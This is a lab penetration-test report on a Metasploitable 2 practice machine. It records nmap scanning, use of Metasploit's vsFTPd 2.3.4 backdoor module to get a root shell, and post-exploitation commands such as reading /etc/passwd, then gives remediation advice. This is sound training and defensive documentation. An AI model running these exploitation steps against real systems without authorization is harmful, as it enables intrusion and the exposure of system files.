# Penetration-testing   

## Target: Metasploitable 2 (Linux)

## Executive Summary
## This penetration test aimed to exploit a vulnerable FTP service on a Metasploitable 2 machine using Metasploit. The successful attack led to root access, allowing full control over the system. The findings demonstrate the risk of running outdated services with known vulnerabilities.
________________________________________
## Scope & Objectives
## Scope:
## •	Target machine: Metasploitable 2 (IP: 192.168.235.132)
## •	Attacker machine: Kali Linux
## •	Exploited service: vsFTPd 2.3.4 (Port 21)
## Objectives:
## 1.	Identify vulnerabilities in the target system.
## 2.	Exploit vsFTPd 2.3.4 backdoor vulnerability.
## 3.	Gain unauthorized access and escalate privileges.
## 4.	Document findings and suggest remediation.
________________________________________
## Exploitation Process
## Information Gathering
## Using Nmap to scan open ports and services:
## ```nmap -sV -A <target-IP>```
![image](https://github.com/user-attachments/assets/cd504c33-0559-4eab-b88e-43dcbd42d438)
![image](https://github.com/user-attachments/assets/678a6291-4f8d-4c19-9fa7-457af37648c6)
![image](https://github.com/user-attachments/assets/9ed00286-e1b9-4230-8976-99e91c5eb220)
![image](https://github.com/user-attachments/assets/216dd39a-1ba1-4599-b244-0241d75ea6bc)
![image](https://github.com/user-attachments/assets/cf7e4253-ceb8-4878-a11d-e36790224479)
![image](https://github.com/user-attachments/assets/0a9e5032-b054-4b34-ada6-a1964ac68a04)
![image](https://github.com/user-attachments/assets/716367b5-fee7-435a-872e-929ee34e2954)

## Findings: Port 21 (FTP) running vsFTPd 2.3.4, a vulnerable version.
## Exploitation with Metasploit
## 1.Launch Metasploit: ```msfconsole``` 
![image](https://github.com/user-attachments/assets/e5c5780d-df07-4268-bd26-7a1f4e1f6e60)
## 2.Use the exploit:
## ```exploit/unix/ftp/vsftpd_234_backdoor```  ,
## ```set RHOSTS <target-IP>```  
## ```exploit``` 
![image](https://github.com/user-attachments/assets/23d873f3-4449-43e0-9af4-00a8fb964ab9)
## Successful shell access obtained:[+] UID: uid=0(root) gid=0(root)  ,  [*] Command shell session 1 opened
 ![image](https://github.com/user-attachments/assets/08335b89-439f-4c55-83e7-688ff5b73835)
## Post-Exploitation
## Commands executed to extract system details: whoami      # Confirm root access 
## uname -a    # System information
## cat /etc/passwd  # List system users
![image](https://github.com/user-attachments/assets/40849ee0-8a3e-45c8-9c18-0b0e99ee318e)
## ps aux      # Running processes  
![image](https://github.com/user-attachments/assets/99bfe22b-17e9-41a5-882e-a2b463857dab)
## netstat -tulnp  # Active network connections
 ![image](https://github.com/user-attachments/assets/28112e4e-b185-4ed5-b1e8-a082240524ee)

## Findings & Impact
## Findings:
## 1.	vsFTPd 2.3.4 backdoor allowed unauthenticated root access.
## 2.	No firewall or intrusion detection prevented exploitation.
## 3.	The system contained multiple misconfigured user accounts.
## Impact:
## •	High risk: Root access means full control over the machine.
## •	Potential for further attacks: Could be used for lateral movement in a network.
## •	Data exposure: Access to system files, logs, and stored credentials.
________________________________________
## Recommendations & Remediation
## 1.	Update vsFTPd to the latest secure version.
## 2.	Disable unused services to minimize attack surface.
## 3.	Implement firewall rules to restrict unauthorized access.
## 4.	Use intrusion detection systems (IDS) like Snort or Suricata.
## 5.	Enforce strong authentication mechanisms to prevent unauthorized access.
________________________________________
## Conclusion
## This penetration test successfully exploited a known vulnerability in vsFTPd, leading to full system compromise. The findings highlight the importance of regularly updating and securing systems. Implementing the recommended security measures will reduce the risk of future attacks.

